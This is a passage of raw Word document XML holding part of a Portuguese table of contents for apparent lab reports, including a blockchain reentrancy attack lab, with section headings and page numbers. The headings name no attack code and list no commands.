                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Objetivos</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881921 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3DC8697D" w14:textId="337DDFCD"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Pré-requisitos</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881922 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4C83AB7D" w14:textId="2A52BACD"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Contexto fornecido:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881923 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7256B465" w14:textId="04803284"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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Passo 1:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881924 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="03538CAB" w14:textId="4447386D"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Passo 2:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881925 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="374826E8" w14:textId="40FD707B"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Passo 3:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881926 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="66096142" w14:textId="4E286F59"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Passo 4:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881927 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="10E4FCB1" w14:textId="62711DBD"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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Passo 5:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881928 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3BBED25D" w14:textId="05BED099"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29" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Passo 6.1:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881929 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="22991F3D" w14:textId="51AFB07C"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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Passo 6.2:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881930 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="67503EC0" w14:textId="49336C1A"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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Passo 6.3:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881931 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>38</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0C84328E" w14:textId="6EBA472D"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Blockchain Reentrancy Attack Lab - Resolução</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881932 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>41</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="46942D27" w14:textId="4ADEE9A1"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Sumário</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881933 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3D951A85" w14:textId="291B0F41"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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1. Introdução</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881934 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1C2722A1" w14:textId="3CD2A40A"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Contexto</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881935 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="24684AD0" w14:textId="2FE29990"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:rFonts w:eastAsia="Cambria"/>
                <w:noProof/>
              </w:rPr>
              <w:t>O ataque de reentrancy ficou mundialmente conhecido após o ataque à DAO em 2016, onde mais de 150 milhões de dólares foram roubados, levando ao hard fork que criou o Ethereum Classic. Esta vulnerabilidade continua relevante, sendo explorada regularmente no ecossistema Ethereum.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881936 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="500ADC9C" w14:textId="1C40D26E"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2. Configuração do Ambiente</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881937 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4BBE3EB6" w14:textId="051027CA"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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1 Setup Inicial</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881938 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5C78B77D" w14:textId="5ABFF8D5"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39" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2 Verificação do Ambiente</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881939 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1E241B6A" w14:textId="25879B11"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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.3 Teste de Conexão</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881940 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6A3C85A6" w14:textId="6DA9660F"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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3. Task 1: Deploy e Análise do Contrato Vulnerável</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881941 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2EE030D6" w14:textId="77FF89E9"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.1 Análise do Código Fonte</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881942 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="69BE3B0F" w14:textId="2EBFCD84"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.2 Compilação do Contrato</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881943 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
